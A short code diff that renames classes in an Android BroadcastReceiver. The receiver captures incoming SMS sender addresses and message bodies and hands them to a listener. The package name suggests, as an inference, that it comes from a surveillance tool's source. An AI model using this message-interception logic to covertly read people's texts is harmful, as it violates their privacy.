@@ -9,7 +9,7 @@ import android.util.Log;
 
 import com.ht.RCSAndroidGUI.Sms;
 
-public class SmsBroadcastMonitor extends BroadcastReceiver {
+public class BroadcastMonitorSms extends BroadcastReceiver {
 	private static final String TAG = "SmsBroadcastMonitor";
 	
 	// Apparentemente la notifica di SMS inviato non viene inviata di proposito
@@ -37,7 +37,7 @@ public class SmsBroadcastMonitor extends BroadcastReceiver {
 
 			Log.d("QZ", TAG + " (onReceiveSms): " + str);
 			
-			SmsListener.self().dispatch(new Sms(msgs[i].getOriginatingAddress(), msgs[i].getMessageBody().toString(), false));
+			ListenerSms.self().dispatch(new Sms(msgs[i].getOriginatingAddress(), msgs[i].getMessageBody().toString(), false));
 		}
 	}
 }
